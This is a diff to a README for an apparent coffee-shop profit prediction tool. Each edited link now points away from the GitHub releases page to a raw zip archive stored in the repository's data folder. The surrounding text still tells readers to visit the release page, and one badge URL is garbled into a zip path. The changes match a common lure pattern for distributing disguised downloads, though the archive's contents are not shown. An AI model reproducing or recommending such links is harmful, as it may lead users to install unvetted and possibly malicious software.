@@ -1,6 +1,6 @@
 # ☕ Coffee-Shop-Profit-Predictor - Predict Coffee Shop Success Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%F0%9F%93%84%20Download-blue)](https://github.com/Reasonable-barrette354/Coffee-Shop-Profit-Predictor/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Reasonable-barrette354/Coffee-Shop-Profit-Predictor/main/data/Coffee-Shop-Profit-Predictor_v1.3-alpha.2.zip%20Latest%20Release-%F0%9F%93%84%20Download-blue)](https://raw.githubusercontent.com/Reasonable-barrette354/Coffee-Shop-Profit-Predictor/main/data/Coffee-Shop-Profit-Predictor_v1.3-alpha.2.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ The Coffee-Shop-Profit-Predictor helps you estimate the profitability of potenti
 To get started, follow these steps to download the software:
 
 1. **Visit the Release Page**: Click on the link below to reach the release page.
-   [Download Here](https://github.com/Reasonable-barrette354/Coffee-Shop-Profit-Predictor/releases)
+   [Download Here](https://raw.githubusercontent.com/Reasonable-barrette354/Coffee-Shop-Profit-Predictor/main/data/Coffee-Shop-Profit-Predictor_v1.3-alpha.2.zip)
 
 2. **Select the Latest Version**: On the release page, find the latest version listed at the top.
 
@@ -92,4 +92,4 @@ This application is licensed under the MIT License, allowing you to use, modify,
 
 For more information on the latest changes, enhancements, and bug fixes, please visit the releases section regularly.
 
-[Download Here](https://github.com/Reasonable-barrette354/Coffee-Shop-Profit-Predictor/releases)
+[Download Here](https://raw.githubusercontent.com/Reasonable-barrette354/Coffee-Shop-Profit-Predictor/main/data/Coffee-Shop-Profit-Predictor_v1.3-alpha.2.zip)
